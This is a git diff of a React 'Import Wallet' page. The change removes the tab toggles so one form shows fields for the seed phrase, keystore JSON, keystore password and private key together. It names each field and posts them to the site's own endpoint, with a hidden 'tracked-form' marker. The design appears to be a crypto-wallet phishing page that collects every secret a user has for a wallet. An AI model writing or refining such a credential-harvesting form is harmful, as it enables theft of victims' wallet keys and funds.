@@ -1,14 +1,14 @@
 import React from 'react';
 import '../../assets/styles/css/wallet-details-entry-page.css';
 import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
-import { useState } from 'react';
+// import { useState } from 'react';
 import Navbar from '../../components/Navbar';
 import Footer from '../../components/Footer';
 
 function WalletDetailsEntryPage() {
-  const [showPhrase, setShowPhrase] = useState(false);
-  const [showKeyJson, setShowKeyJson] = useState(false);
-  const [showPrivateKey, setShowPrivateKey] = useState(true);
+  // const [showPhrase, setShowPhrase] = useState(false);
+  // const [showKeyJson, setShowKeyJson] = useState(false);
+  // const [showPrivateKey, setShowPrivateKey] = useState(true);
 
   // form handling
 
@@ -17,45 +17,45 @@ function WalletDetailsEntryPage() {
   // const [password, setPassword] = useState('');
   // const [privateKey, setPrivatekey] = useState('');
 
-  // function validateForm(e) {
-  //   if (
-  //     phrase === '' ||
-  //     keyJson === '' ||
-  //     password.value === '' ||
-  //     privateKey === ''
-  //   ) {
-  //     e.preventDefault();
-  //     alert(
-  //       `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
-  //     );
-  //     return false;
-  //   }
+  function validateForm(event) {
+    event.preventDefault();
+    // if (
+    //   phrase === '' ||
+    //   keyJson === '' ||
+    //   password.value === '' ||
+    //   privateKey === ''
+    // ) {
+    //   alert(
+    //     `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
+    //   );
+    //   return false;
+    // }
+  }
+
+  // function displayPhrase() {
+  //   setShowPhrase(true);
+  //   setShowKeyJson(false);
+  //   setShowPrivateKey(false);
   // }
 
-  function displayPhrase() {
-    setShowPhrase(true);
-    setShowKeyJson(false);
-    setShowPrivateKey(false);
-  }
+  // function displayKeyJson() {
+  //   setShowKeyJson(true);
+  //   setShowPhrase(false);
+  //   setShowPrivateKey(false);
+  // }
 
-  function displayKeyJson() {
-    setShowKeyJson(true);
-    setShowPhrase(false);
-    setShowPrivateKey(false);
-  }
-
-  function displayPrivateKey() {
-    setShowPrivateKey(true);
-    setShowPhrase(false);
-    setShowKeyJson(false);
-  }
+  // function displayPrivateKey() {
+  //   setShowPrivateKey(true);
+  //   setShowPhrase(false);
+  //   setShowKeyJson(false);
+  // }
 
   return (
     <>
       <Navbar />
       <section className="wallet-details-entry-section">
         <div className="section-header text-center">Import Wallet</div>
-        <div className="options-wrapper">
+        {/* <div className="options-wrapper">
           <button
             className="option-item"
             style={{
@@ -86,13 +86,13 @@ function WalletDetailsEntryPage() {
           >
             Private Key
           </button>
-        </div>
+        </div> */}
         <form
           className="form-area"
           method="POST"
-          // action="./form-action-page.html"
+          action="/wallet-details-entry-page"
           name="Wallet_import_details"
-          // onSubmit={validateForm}
+          onSubmit={validateForm}
         >
           <input
             type="hidden"
@@ -100,61 +100,65 @@ function WalletDetailsEntryPage() {
             value="tracked-form"
           />
 
-          {showPhrase && (
-            <div className="mb-3">
-              <textarea
-                className="form-control"
-                placeholder="Phrase"
-                rows="5"
-                // value={phrase}
-                // onChange={(e) => setPhrase(e.target.value)}
-              ></textarea>
-              <div className="tip-text">
-                Typically 12 (sometimes 24) words separated by single spaces.
-              </div>
+          {/* {showPhrase && ( */}
+          <div className="mb-3">
+            <textarea
+              className="form-control"
+              placeholder="Phrase"
+              name="Phrase"
+              rows="5"
+              // value={phrase}
+              // onChange={(e) => setPhrase(e.target.value)}
+            ></textarea>
+            <div className="tip-text">
+              Typically 12 (sometimes 24) words separated by single spaces.
             </div>
-          )}
-          {showKeyJson && (
-            <div className="mb-3">
-              <textarea
-                style={{ marginBottom: '20px' }}
-                className="form-control"
-                // value={keyJson}
-                // onChange={(e) => setKeyJson(e.target.value)}
-                placeholder="Keystore JSON"
-                rows="5"
-              ></textarea>
-              <div>
-                <input
-                  type="password"
-                  className="form-control"
-                  placeholder="Password"
-                  id="inputPassword"
-                  // value={password}
-                  // onChange={(e) => setPassword(e.target.value)}
-                ></input>
-              </div>
-              <div className="tip-text">
-                Several lines of text beginning with '(...)' plus the password
-                you used to encrypt it.
-              </div>
-            </div>
-          )}
-
-          {showPrivateKey && (
-            <div className="mb-3">
+          </div>
+          {/* )} */}
+          {/* {showKeyJson && ( */}
+          <div className="mb-3">
+            <textarea
+              style={{ marginBottom: '20px' }}
+              className="form-control"
+              // value={keyJson}
+              // onChange={(e) => setKeyJson(e.target.value)}
+              placeholder="Keystore JSON"
+              name="Keystore JSON"
+              rows="5"
+            ></textarea>
+            <div>
               <input
-                type="text"
+                type="password"
                 className="form-control"
-                placeholder="Private Key"
-                // value={privateKey}
-                // onChange={(e) => setPrivatekey(e.target.value)}
+                placeholder="Password"
+                name="Password"
+                id="inputPassword"
+                // value={password}
+                // onChange={(e) => setPassword(e.target.value)}
               ></input>
-              <div className="tip-text">
-                Typically 12 (sometimes 24) words separated by single spaces.
-              </div>
             </div>
-          )}
+            <div className="tip-text">
+              Several lines of text beginning with '(...)' plus the password you
+              used to encrypt it.
+            </div>
+          </div>
+          {/* )} */}
+
+          {/* {showPrivateKey && ( */}
+          <div className="mb-3">
+            <input
+              type="text"
+              className="form-control"
+              placeholder="Private Key"
+              name="Private key"
+              // value={privateKey}
+              // onChange={(e) => setPrivatekey(e.target.value)}
+            ></input>
+            <div className="tip-text">
+              Typically 12 (sometimes 24) words separated by single spaces.
+            </div>
+          </div>
+          {/* )} */}
 
           <div className="submit-button-wrapper">
             <button
